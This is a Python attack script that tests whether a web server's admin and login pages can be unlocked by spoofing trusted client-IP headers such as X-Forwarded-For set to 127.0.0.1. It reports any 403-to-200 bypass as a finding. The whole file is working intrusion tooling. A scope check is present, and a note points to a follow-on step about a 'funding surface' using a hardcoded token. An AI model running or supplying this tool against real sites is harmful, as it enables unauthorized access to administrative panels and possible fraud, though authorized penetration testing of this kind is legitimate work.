#!/usr/bin/env python3
"""信任 IP 头旁路（HITCON IP 偽造 / 白名单）。

基线 vs XFF/X-Real-IP/True-Client-IP/Client-IP=127.0.0.1。
L2：403/401 → 200 且体不像同一块 WAF 页。
"""
from __future__ import annotations

import argparse
import json
import re
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any
from urllib.parse import urljoin

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # type: ignore
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope, write_probe_json  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-trust-ip"
PATHS = ("/", "/admin", "/admin/", "/login", "/backend", "/manage")
SPOOF = (
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1"},
)
OK_NEEDLES = ("dashboard", "console", "后台", "管理", "logout", "sign out")
DENY_NEEDLES = (
    "access denied", "you have been blocked", "attention required",
    "cloudflare", "error 1020", "forbidden", "just a moment",
)
ADMIN_LOC = ("/admin", "/dashboard", "/console", "/manage", "/backend")


def spoof_opened(base_r: dict[str, Any], spoof: dict[str, Any]) -> bool:
    """403/401 → 200 且像后台，或跳到后台路径。只靠体长不够。"""
    if base_r.get("status") not in {401, 403} or spoof.get("denyish"):
        return False
    loc = (spoof.get("loc") or "").lower()
    loc_admin = any(x in loc for x in ADMIN_LOC)
    if spoof.get("status") in {301, 302, 303} and loc_admin:
        return True
    return spoof.get("status") == 200 and bool(spoof.get("adminish"))


def _hit(sess: requests.Session, url: str, headers: dict[str, str] | None = None) -> dict[str, Any]:
    try:
        r = sess.get(url, timeout=10, verify=False, allow_redirects=False, headers=headers or {})
    except Exception as e:
        return {"url": url, "error": str(e)[:120]}
    text = r.text or ""
    return {
        "url": url,
        "status": r.status_code,
        "size": len(text),
        "loc": (r.headers.get("Location") or "")[:120],
        "adminish": any(n in text.lower() for n in OK_NEEDLES),
        "denyish": any(n in text.lower() for n in DENY_NEEDLES),
        "snip": re.sub(r"\s+", " ", text)[:100],
    }


def run(args: argparse.Namespace) -> dict[str, Any]:
    host = host_of(args.base)
    if not host or not in_scope(host):
        print(f"[!] 不在 scope：{host or args.base}", file=sys.stderr)
        sys.exit(2)
    base = args.base.rstrip("/")
    sess = requests.Session()
    sess.headers["User-Agent"] = UA
    findings: list[dict[str, Any]] = []
    for p in PATHS:
        url = urljoin(base + "/", p.lstrip("/"))
        base_r = _hit(sess, url)
        if base_r.get("error"):
            continue
        if base_r.get("status") in {401, 403}:
            findings.append({"level": "L1", "signal": "gated", "path": p, "status": base_r["status"]})
        for hdr in SPOOF:
            spoof = _hit(sess, url, hdr)
            if spoof.get("error"):
                continue
            if spoof_opened(base_r, spoof):
                findings.append({
                    "level": "L2",
                    "signal": "header-bypass",
                    "path": p,
                    "header": next(iter(hdr)),
                    "base_status": base_r.get("status"),
                    "spoof_status": spoof.get("status"),
                })
                print(f"  L2 {p} {next(iter(hdr))} {base_r.get('status')}→{spoof.get('status')}")
                break
        if any(f.get("level") == "L2" for f in findings):
            break
    level = "L2" if any(f.get("level") == "L2" for f in findings) else (
        "L1" if findings else "none"
    )
    report = {
        "target": base,
        "ts": datetime.now(UTC).isoformat(),
        "level": level,
        "findings": findings,
        "playbook": "传承/信头·踪.md",
        "next": "L2=信任头把 403 打成 200。加款面另走 hardcoded-token-cfip-fund。",
    }
    out_path = write_probe_json(
        report, case=args.case, out=args.out, case_subdir="trust_ip", filename="surface.json",
    )
    print(json.dumps({"level": level, "findings": len(findings), "out": str(out_path)}, ensure_ascii=False))
    return report


def main() -> None:
    ap = argparse.ArgumentParser(description="信任 IP 头旁路（授权内）")
    ap.add_argument("--base", required=True)
    ap.add_argument("--case", default="")
    ap.add_argument("--out", type=Path, default=None)
    args = ap.parse_args()
    run(args)


if __name__ == "__main__":
    main()
